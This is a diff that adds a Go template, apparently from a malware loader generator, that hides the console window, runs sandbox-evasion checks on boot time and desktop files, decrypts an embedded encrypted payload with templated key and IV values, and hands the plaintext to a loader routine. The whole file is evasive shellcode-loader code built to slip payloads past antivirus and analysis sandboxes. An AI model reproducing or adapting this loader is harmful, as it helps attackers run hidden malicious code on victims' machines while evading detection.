@@ -1,0 +1,25 @@
+package main
+
+import (
+	"variant/crypto"
+	"variant/loader"
+	"variant/sandbox"
+)
+
+func init() {
+	loader.HideConsoleWin()
+	sandbox.BootTime()
+	sandbox.GetDesktopFiles()
+}
+
+func main() {
+	{{.KeyName}} := []byte("{{.KeyValue}}")
+	{{if .IvName}}
+	{{.IvName}} := []byte("{{.IvValue}}")
+	{{end}}
+
+	{{.CipherText}} := "{{.Payload}}"
+	{{.PlainText}}, _ := crypto.{{.Decrypt}}({{.CipherText}}, {{.KeyName}}{{if .IvName}}, {{.IvName}}{{end}})
+
+	loader.{{.Loader}}({{.PlainText}})
+}
